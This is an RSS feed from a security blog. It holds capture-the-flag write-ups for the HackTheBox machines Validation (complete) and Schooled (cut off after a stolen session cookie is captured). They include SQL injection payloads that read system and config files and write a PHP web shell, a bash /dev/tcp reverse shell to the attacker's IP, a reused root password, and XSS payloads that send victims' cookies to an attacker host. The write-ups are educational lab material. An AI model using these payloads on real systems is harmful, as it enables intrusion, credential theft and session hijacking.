<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>HackTheBox on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/categories/hackthebox/</link>
    <description>Recent content in HackTheBox on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 24 Sep 2021 19:11:30 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/categories/hackthebox/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Validation</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-validation/</link>
      <pubDate>Fri, 24 Sep 2021 19:11:30 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-validation/</guid>
      <description>Validation is a machine from the UHC September qualifiers and is currently live on Hack The Box as a retired machine. It starts with enumeration on a website and identifying a second order SQL injection. The SQL user can use various SQL functions, two of which allow for file read and file write. With file read ability, the web config which contains database credentials can be read. With the ability to write file and write permission on the web root, it is possible to drop a web shell to gain a foothold on the system.</description>
      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Validation">Validation</a>  is a machine from the UHC September qualifiers and is currently live on Hack The Box as a retired machine. It starts with enumeration on a website and identifying a second order SQL injection. The SQL user can use various SQL functions, two of which allow for file read and file write. With file read ability, the web config which contains database credentials can be read. With the ability to write file and write permission on the web root, it is possible to drop a web shell to gain a foothold on the system. For the root part, the password for the database is found to be re-used by the root account.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>SQL injection</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All TCP ports scan with <code>nmap</code> discovers 4 open ports: SSH on 22, three web servers on 80, 4566 (probably LocalStack), and 8080.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
$ fscan 10.10.11.116 validation
nmap -p- 10.10.11.116 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
nmap -p 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080 -sC -sV -oA nmap/all-tcp-ports-validation 10.10.11.116
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-22 16:46 EDT
Nmap scan report <span class="k">for</span> 10.10.11.116
Host is up <span class="o">(</span>0.051s latency<span class="o">)</span>.

PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open     http           Apache httpd 2.4.48 <span class="o">((</span>Debian<span class="o">))</span>
<span class="p">|</span>_http-server-header: Apache/2.4.48 <span class="o">(</span>Debian<span class="o">)</span>
<span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
4566/tcp open     http           nginx
<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http           nginx
<span class="p">|</span>_http-title: <span class="m">502</span> Bad Gateway
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.07 seconds
</code></pre></div><p>The filtered ports indicate that there are some firewall/IP table rules applied on the machine.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Port 80 presents a registration page of UHC. Adding <code>index.php</code> reveals that it&rsquo;s PHP site.</p>
<p><div class="img-container"><img src="imgs/image-20210923035321832.png" alt="image-20210923035321832"  /></div>
</p>
<p>I can register on it, and it redirects to <code>/account.php</code>. The submitted inputs (country and username) are reflected back here, and this can be an indicator for injection point.</p>
<p><div class="img-container"><img src="imgs/image-20210923040838459.png" alt="image-20210923040838459"  /></div>
</p>
<p>The HTTP request for register, which was previously intercepted using Burp Suite, is as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>
<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">35</span>
<span class="n">Origin</span><span class="o">:</span> <span class="l">http://10.10.11.116</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.11.116/index.php</span>
<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>

username=choropys&amp;country=Indonesia
</code></pre></div><p>And the server responses with <code>302</code> which redirects to <code>/account.php</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="n">Date</span><span class="o">:</span> <span class="l">Wed, 22 Sep 2021 21:08:19 GMT</span>
<span class="n">Server</span><span class="o">:</span> <span class="l">Apache/2.4.48 (Debian)</span>
<span class="n">X-Powered-By</span><span class="o">:</span> <span class="l">PHP/7.4.23</span>
<span class="n">Set-Cookie</span><span class="o">:</span> <span class="l">user=f1bffe3047f1550d765a66e3ac54515c</span>
<span class="n">Location</span><span class="o">:</span> <span class="l">/account.php</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">0</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
</code></pre></div><p>The response also contains a cookie that just the <code>md5sum</code> from of the username.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
$ <span class="nb">echo</span> -n <span class="s1">&#39;choropys&#39;</span> <span class="p">|</span> md5sum                                                                 
f1bffe3047f1550d765a66e3ac54515c
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="sql-injection">SQL injection</h3>
<h4 id="detection">Detection</h4>
<p>When I submit another registration request with the following payload,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>

<span class="g">...[SNIP]...
</span><span class="g">
</span><span class="g">username=choropys&#39;&amp;country=Indonesia&#39;
</span></code></pre></div><p>and then immediately navigate to <code>/account.php</code>, the page shows an error message.</p>
<p><div class="img-container"><img src="imgs/image-20210923041509664.png" alt="image-20210923041509664"  /></div>
</p>
<p>If I search for  <code>fetch_assoc()</code>, it&rsquo;s a PHP function that typically used to handle database records.</p>
<p>Now if I change the <code>country</code>  value to <code>Indonesia' -- #</code> , the page doesn&rsquo;t error out.</p>
<p><div class="img-container"><img src="imgs/image-20210923041604118.png" alt="image-20210923041604118"  /></div>
</p>
<p>From here, I can assume that the site is vulnerable to SQL injection.</p>
<p>I will submit <code>country=Indonesia'ORDER BY 1,2 -- #</code> to identify the number of available columns, and the <code>/account.php</code> page returns with the same error.</p>
<p><div class="img-container"><img src="imgs/image-20210923042953130.png" alt="image-20210923042953130"  /></div>
</p>
<p>So the query in the backend only wants a single column.</p>
<h4 id="leak-source">Leak source</h4>
<p>I couldn&rsquo;t find any credentials on the database, but I found out that the MySQL <code>load_file()</code> function isn&rsquo;t restricted. I can read the <code>/etc/passwd</code> file using that function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">username=choropys&amp;country=&#39;UNION SELECT load_file(&#39;/etc/passwd&#39;) -- #
</code></pre></div><p>When I refresh <code>/account.page</code></p>
<p><div class="img-container"><img src="imgs/image-20210923043603480.png" alt="image-20210923043603480"  /></div>
</p>
<p>Since the location of <code>account.php</code> has been leaked by the error message, I can try to load that file with <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>. When I refresh the <code>account.php</code> page and view its source, the source code of <code>account.php</code> is there, and it also leaks the configuration file.</p>
<p><div class="img-container"><img src="imgs/image-20210923044030733.png" alt="image-20210923044030733"  /></div>
</p>
<p>I can try to read <code>config.php</code> by changing my payload to <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>, and it reveals database credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210923044108761.png" alt="image-20210923044108761"  /></div>
</p>
<p>I will note these creds.</p>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="web-shell">Web shell</h4>
<p>I also find that writing files is allowed on <code>/var/www/html/</code>, therefore I could put a web shell there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">username=choropys&amp;country=&#39;UNION SELECT &#34;&lt;?php system($_REQUEST[c]); ?&gt;&#34; INTO OUTFILE &#34;/var/www/html/chrp.php&#34; -- #	
</code></pre></div><p>And now I have code execution.</p>
<p><div class="img-container"><img src="imgs/image-20210923045051661.png" alt="image-20210923045051661"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>The system does have bash, but my reverse shell doesn&rsquo;t work with the GET method, so I changed the request to use the POST method and URL encode the payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">c=/bin/bash+-c+&#34;/bin/bash+-i+&gt;%26+/dev/tcp/10.10.14.5/21+0&gt;%261&#34;
</code></pre></div><p>On my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
$ nc -nvlp <span class="m">21</span>                                                
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">21</span> ...
connect to <span class="o">[</span>10.10.14.5<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.116<span class="o">]</span> <span class="m">37096</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@validation:/var/www/html$ id 
id 
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div><p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/var/www/html$ which script
which script
/usr/bin/script
www-data@validation:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is <span class="s1">&#39;/dev/null&#39;</span>.
www-data@validation:/var/www/html$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> suspended  nc -nvlp <span class="m">21</span>
→ root@kali «exploits» «10.10.14.49» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> continued  nc -nvlp <span class="m">21</span>

www-data@validation:/var/www/html$ 
</code></pre></div><p>The root flag is readable by others, so I could grab it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/home/htb$ ls -lR /home
/home:
total <span class="m">4</span>
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Sep <span class="m">9</span> 12:09 htb

/home/htb:
total <span class="m">4</span>
-rw-r--r-- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 user.txt
</code></pre></div><p>I also noticed that I&rsquo;m inside a Docker container because there is <code>.dockerenv</code> at the root file system</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/$ ls -l .dockerenv
-rwxr-xr-x <span class="m">2</span> root root <span class="m">0</span> Sep <span class="m">16</span> 13:39 .dockerenv
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="su-root">su root</h4>
<p>In the previous enumeration using SQLi, I didn&rsquo;t see user <strong>htb</strong> listed in the <code>/etc/passwd</code> file, and it&rsquo;s only <strong>root</strong> that has a login shell. So I tried the database password I obtained from the <code>config.php</code> file on <strong>root</strong>, and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/$ su -   
su -
Password: uhc-9qual-global-pw

root@validation:~# 
</code></pre></div><p>I thought I needed to escape from this container, but when I checked the<code>/root/</code> directory, the root flag was there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@validation:/# ls -l /root/root.txt 
-r-------- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 root.txt
</code></pre></div><p>I also briefly thought that maybe a player had left a copy of the root flag of the host in this container. But, after I watched the <a href="https://www.youtube.com/watch?v=UqoVQ4dbYaI">official walkthrough</a> video by ippsec and read the <a href="https://0xdf.gitlab.io/2021/09/14/htb-validation.html">writeup</a> by 0xdf, the box ended this way 😅.</p>
<hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Schooled</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-schooled/</link>
      <pubDate>Thu, 16 Sep 2021 18:22:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-schooled/</guid>
      <description>Moodle exploitation using CVEs</description>
      <content:encoded><![CDATA[<p>Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, thus allowing me to install a malicious plugin to gain interactive shell access to the system. Internal enumeration reveals database credentials which can be used to recover a password from the database. The password is reused by one of the users for SSH login. This user is allowed to install FreeBSD packages with <code>sudo</code> permissions, and it can be exploited to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Stealing cookie with XSS</li>
<li>Moodle exploitation</li>
<li>Sudo exploitation on <code>pkg</code></li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full scan with nmap discovers three open ports: SSH on 22, an Apache web server on port 80 and a service that <code>nmap</code> identifies it as mysqlx.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-schooled 10.10.10.234
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 14:34 EDT
Nmap scan report <span class="k">for</span> 10.10.10.234
Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.045s latency<span class="o">)</span>.
Not shown: <span class="m">65532</span> closed ports
Reason: <span class="m">65532</span> resets
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp    open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
33060/tcp open  mysqlx? syn-ack ttl <span class="m">63</span>
<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>5/17%Time<span class="o">=</span>60A2BA63%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>N
...<span class="o">[</span>SNIP<span class="o">]</span>...
Service Info: OS: FreeBSD<span class="p">;</span> CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 801.40 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---schooledhtb">TCP 80 - schooled.htb</h3>
<p>Port 80 serving a homepage of a school institution.</p>
<p><div class="img-container"><img src="imgs/image-20210518035709619.png" alt="image-20210518035709619"  /></div>
</p>
<p>In the About section, it states that this school has an online learning system using Moodle.</p>
<p><div class="img-container"><img src="imgs/image-20210518041407775.png" alt="image-20210518041407775"  /></div>
</p>
<p>The Teachers section displays the teachers of the school. This can be useful for generating username list.</p>
<p><div class="img-container"><img src="imgs/image-20210518035931687.png" alt="image-20210518035931687"  /></div>
</p>
<p>On the Contact section, there is an input form. The form submit button points to <code>/contact.php</code>, but it returns with 404.</p>
<p>At the bottom of the site, it reveals an email address and a domain name: <code>schooled.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210518035750397.png" alt="image-20210518035750397"  /></div>
</p>
<p>I will update my <code>/etc/hosts</code> with that domain name.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb&#39;</span> &gt;&gt; /etc/hosts/
</code></pre></div><p>Poking back the site with <code>curl</code> using its domain name reveals that it&rsquo;s the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$  curl -s http://10.10.10.234/ <span class="p">|</span> wc -c
<span class="m">20750</span>
→ root@kali «schooled» «10.10.14.49» 
$ curl -s http://schooled.htb/ <span class="p">|</span> wc -c
<span class="m">20750</span>
</code></pre></div><h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
<p>Enumerating subdomain using <code>gobuster</code> reveals that there is one called <code>moodle.schooled.htb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ gobuster vhost -u <span class="s1">&#39;http://schooled.htb/&#39;</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:          http://schooled.htb/
<span class="o">[</span>+<span class="o">]</span> Method:       GET
<span class="o">[</span>+<span class="o">]</span> Threads:      <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
<span class="o">[</span>+<span class="o">]</span> User Agent:   gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Timeout:      <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/05/17 17:11:00 Starting gobuster in VHOST enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
Found: moodle.schooled.htb <span class="o">(</span>Status:  200<span class="o">)</span> <span class="o">[</span>Size: 84<span class="o">]</span>
</code></pre></div><p>I will update <code>/etc/hosts</code> again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb moodle.schooled.htb&#39;</span>
</code></pre></div><p>And it&rsquo;s different site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ curl -s http://moodle.schooled.htb/ <span class="p">|</span> wc -c <span class="o">&amp;&amp;</span> curl -s http://schooled.htb <span class="p">|</span> wc -c
<span class="m">84</span>
<span class="m">20750</span>
</code></pre></div><h3 id="tcp-80---moodleschooledhtb">TCP 80 - moodle.schooled.htb</h3>
<p>Heading to <code>moodle.schooled.htb</code> shows that it&rsquo;s <a href="https://moodle.org/">Moodle LMS</a>, and there are four courses available here.</p>
<p><div class="img-container"><img src="imgs/image-20210518171919132.png" alt="image-20210518171919132"  /></div>
</p>
<p>It allows guest login, but nothing much I can do with that, so I will just register an account.</p>
<h4 id="account-register">Account Register</h4>
<p>To register an account I have to use the domain <code>student.schooled.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210518173537504.png" alt="image-20210518173537504"  /></div>
</p>
<p>I will change my email domain and login afterwards.</p>
<p>When I visit the domain <code>student.schooled.htb</code>, it returns the same site as <code>schooled.htb</code>.</p>
<h4 id="enroll-course">Enroll course</h4>
<p>Based on the login activity,  Manuel Phillips is the only teacher that seems to be active. So I will enroll to his course (it allows self-enroll).</p>
<p><div class="img-container"><img src="imgs/image-20210518174336502.png" alt="image-20210518174336502"  /></div>
</p>
<p>On the Mathematics course, there are two announcements .</p>
<p><div class="img-container"><img src="imgs/image-20210518175011420.png" alt="image-20210518175011420"  /></div>
</p>
<p>The oldest announcement by Jamie Borham is just a welcome message.</p>
<p><div class="img-container"><img src="imgs/image-20210518175145618.png" alt="image-20210518175145618"  /></div>
</p>
<p>The one that titled &ldquo;Reminder for joining students&rdquo; by Manuel Phillips is a reminder for the students to set their MoodleNet profiles.</p>
<p><div class="img-container"><img src="imgs/image-20210518175100601.png" alt="image-20210518175100601"  /></div>
</p>
<p>The &ldquo;MoodleNet profile&rdquo; that Manuel Phillips was talking about can be found at <code>Dashboard -&gt; Preferences -&gt; User account -&gt; Edit profile</code> .</p>
<p><div class="img-container"><img src="imgs/image-20210518183135218.png" alt="image-20210518183135218"  /></div>
</p>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<h4 id="exploit-db">Exploit-DB</h4>
<p>At that time, I didn&rsquo;t know how to determine the Moodle version, so I started to search the Moodle vulnerabilities on Exploit-DB using keyword <code>Moodle</code> and sorted the results by latest, here are some potential public exploits I found:</p>
<ul>
<li>Moodle 3.10.3 - &lsquo;url&rsquo; Persistent Cross Site Scripting =&gt; Need a teacher or an administrator or a manager role.</li>
<li>Moodle 3.10.3 - &lsquo;label&rsquo; Persistent Cross Site Scripting =&gt; Worth to try.</li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210518183748916.png" alt="image-20210518183748916"  /></div>
</p>
<h4 id="moodle-security">Moodle Security</h4>
<p>The other place to look for the Moodle vulnerabilities/security issues is on  <a href="https://moodle.org/security/">https://moodle.org/security/</a>.</p>
<p>Searching page by page, I find one stored XSS that seems interesting because it contains &ldquo;moodlenetprofile&rdquo; in its title.</p>
<p><div class="img-container"><img src="imgs/image-20210518220404280.png" alt="image-20210518220404280"  /></div>
</p>
<p>Another one that looks promising is the privilege escalation from the teacher role into manager role.</p>
<p><div class="img-container"><img src="imgs/image-20210520020814806.png" alt="image-20210520020814806"  /></div>
</p>
<h3 id="testing-xss">Testing XSS</h3>
<h4 id="moodle-3103---label-persistent-cross-site-scripting">Moodle 3.10.3 - &lsquo;label&rsquo; Persistent Cross Site Scripting</h4>
<p>I tried <code>Moodle 3.10.3 - 'label' Persistent Cross Site Scripting</code> using the following payload.</p>
<pre tabindex="0"><code>&lt;img src=&quot;http://10.10.14.49/iamf.js&quot; onerror=&quot;alert('iamf')&quot; /&gt;
</code></pre><p><div class="img-container"><img src="imgs/image-20210518214318578.png" alt="image-20210518214318578"  /></div>
</p>
<p>It worked.</p>
<p><div class="img-container"><img src="imgs/image-20210518214351609.png" alt="image-20210518214351609"  /></div>
</p>
<p>Unfortunately, it&rsquo;s an XHR. I didn&rsquo;t know how to get the link, and probably teacher won&rsquo;t look into the calendar or respond to my chat (phishing). But, based on this attempt, it seems the currently hosted Moodle version is &lt; 3.10.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="access-as-manuel-phillips">Access as Manuel Phillips</h3>
<h4 id="moodle-cve-2020-25627---stored-xss-via-moodlenet-profile">Moodle CVE-2020-25627 - Stored XSS via MoodleNet profile</h4>
<p>From the previous enumeration, I remember that Phillips mentioned &lsquo;MoodleNet profile&rsquo;, which actually the hint to the stored XSS (<a href="https://moodle.org/mod/forum/discuss.php?d=410839&amp;__cf_chl_captcha_tk__=pmd_kdXMGLO2gONcgFQGznuXi0NScKF9l4nL1tJSsqrMN4o-1631707461-0-gqNtZGzNAxCjcnBszQhR">CVE-2020-25627</a>) vulnerability affected the MoodleNet profile. XSS attack is typically used to <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies">steal a user cookie session</a>. So in this case, I&rsquo;m going to steal Manuel Phillips&rsquo;s cookie.</p>
<p>First, I will setup a netcat listener on port 80, then I will edit my MoodleNet profile (<code>Dashboard &gt; Preferences &gt; User account &gt; Edit profile &gt; MoodleNet profile</code>) and change its value to the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span> <span class="nx">iamf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span> <span class="nx">iamf</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://10.10.14.49/?iamf=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p>Or this one:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&#34;http://10.10.14.49/?iamf=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="s1">&#39;&#34; /&gt;&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210520012522733.png" alt="image-20210520012522733"  /></div>
</p>
<p>After a few minutes, there is a request coming to my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
$ nc -nvlp <span class="m">80</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">26076</span>
GET /?iamf<span class="o">=</span><span class="nv">MoodleSession</span><span class="o">=</span>40mch0eki9ko6kpe03kq36cd97 HTTP/1.1
Host: 10.10.14.49
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> FreeBSD amd64<span class="p">;</span> rv:86.0<span class="o">)</span> Gecko/20100101 Firefox/86.0
Accept: image/webp,*/*
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://moodle.schooled.htb/moodle/user/profile.php?id<span class="o">=</span><span class="m">33</span>
</code></pre></div><p>I will update my <code>MoodleSession</code> to the one I obtained from XSS.</p>
